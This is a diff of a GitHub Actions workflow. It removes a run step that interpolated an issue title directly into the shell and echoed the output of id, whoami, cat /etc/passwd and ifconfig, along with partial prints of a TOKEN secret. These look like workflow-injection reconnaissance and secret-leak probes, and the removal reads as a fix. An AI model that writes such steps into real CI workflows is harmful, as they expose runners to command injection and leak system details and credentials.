@@ -5,7 +5,7 @@ on:
     branches: [ main ]
   pull_request:
     branches: [ main ]
-
+  
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -16,13 +16,6 @@ jobs:
     - uses: actions/checkout@v4
     - run: |
         echo ${{ github.repository }}
-        echo "New issue: ${{ github.event.issue.title }}"
-        echo "New issue: $(id)"
-        echo "New issue: $(whoami)"
-        echo "New issue: $(cat /etc/passwd)"
-        echo "New issue: $(ifconfig)"
-        echo "${TOKEN:0:9}[...]"
-        echo "${TOKEN:0:9}[...]"
              
     - name: Set up Python
       uses: actions/setup-python@v5
